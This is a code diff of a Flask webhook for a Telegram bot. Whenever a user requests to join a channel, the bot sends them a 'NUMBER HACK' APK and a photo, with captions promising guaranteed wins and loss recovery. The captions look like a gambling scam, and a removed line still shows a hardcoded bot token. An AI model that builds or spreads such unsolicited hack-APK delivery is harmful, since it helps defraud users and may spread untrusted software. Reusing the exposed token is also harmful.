@@ -1,14 +1,14 @@
 import os
 import asyncio
-import requests
-from io import BytesIO
 from flask import Flask, request
 from telegram import Update, Bot
 
 # ================= CONFIG =================
-BOT_TOKEN = "8647299391:AAFElYz6ARGQSakXH0Ir6xNCGzeLTknR9Mo"
+# Ab token GitHub par nahi dikhega, Vercel Secrets se aayega
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+
 APK_URL = "https://raw.githubusercontent.com/toptenowner999-maker/KD/2301c244938dcdaa227fc13913abeca114beae95/JAI~CLUB%20NUMBER%20HACK_1.0.apk"
-WELCOME_PHOTO_URL = "https://raw.githubusercontent.com/toptenowner999-maker/KD/69738a5485ee3039cff79f9974ccc6de0b75e494/IMG_20260511_111128_792.jpg"
+PHOTO_URL = "https://raw.githubusercontent.com/toptenowner999-maker/KD/69738a5485ee3039cff79f9974ccc6de0b75e494/IMG_20260511_111128_792.jpg"
 
 # Header Layout (3 + 4 + 4)
 APK_CAPTION = (
@@ -18,20 +18,13 @@ APK_CAPTION = (
     "𝟭𝟬𝟬% 𝗡𝘂𝗺𝗯𝗲𝗿 𝗛𝗮𝗰𝗸 💥\n\n𝗢𝗻𝗹𝘆 𝗙𝗼𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗨𝘀𝗲𝗿𝘀 💎\n\n𝟭𝟬𝟬% 𝗟𝗼𝘀𝘀 𝗥𝗲𝗰𝗼𝘃𝗲𝗿 𝗚𝘂𝗮𝗿𝗮𝗻𝘁𝗲𝗲 🛡\n\n𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 ➡️ @KD_HACK_MANAGER ✅"
 )
 
-WELCOME_CAPTION = (
-    "🤑 MEMBERS FEEDBACK 🤑\n\n"
-    "💎 BEST HACK AND GENUINE STREAK WINNING 💎\n\n"
-    "⬇️ PANNEL LINK ⬇️\n\n"
-    "https://t.me/m/kkE6P6nfZDhl"
-)
-
 app = Flask(__name__)
-bot = Bot(token=BOT_TOKEN)
 
-async def process_assets(user_id):
-    """Assets bhejne ka kaam bina Vercel ko hang kiye"""
+async def send_to_user(user_id):
+    # Function ke andar bot initialize kar rahe hain fresh token ke saath
+    bot = Bot(token=BOT_TOKEN)
     try:
-        # APK Bhejna
+        # Document (APK)
         await bot.send_document(
             chat_id=user_id, 
             document=APK_URL, 
@@ -39,37 +32,34 @@ async def process_assets(user_id):
             caption=APK_CAPTION, 
             parse_mode="HTML"
         )
-        # Photo Bhejna
+        # Photo
         await bot.send_photo(
             chat_id=user_id, 
-            photo=WELCOME_PHOTO_URL, 
-            caption=WELCOME_CAPTION, 
+            photo=PHOTO_URL, 
+            caption="💎 BEST HACK AND GENUINE STREAK WINNING 💎", 
             parse_mode="HTML"
         )
     except Exception as e:
-        print(f"Error sending to {user_id}: {e}")
+        print(f"Error in send_to_user: {e}")
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
     if request.method == "POST":
         try:
+            bot = Bot(token=BOT_TOKEN)
             update = Update.de_json(request.get_json(force=True), bot)
             
-            # Agar koi channel join request aayi ho
             if update.chat_join_request:
                 user_id = update.chat_join_request.from_user.id
-                # Vercel's sync handler needs to run the async task
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                loop.run_until_complete(process_assets(user_id))
-                loop.close()
+                # Vercel synchronous environment fix
+                asyncio.run(send_to_user(user_id))
                 
             return "OK", 200
         except Exception as e:
-            print(f"Webhook Crash: {e}")
-            return "Internal Error", 500
+            print(f"Webhook Error: {e}")
+            return "Error", 500
     return "Forbidden", 403
 
 @app.route('/')
 def index():
-    return "Bot status: Running", 200
+    return "Bot is Running Securely", 200
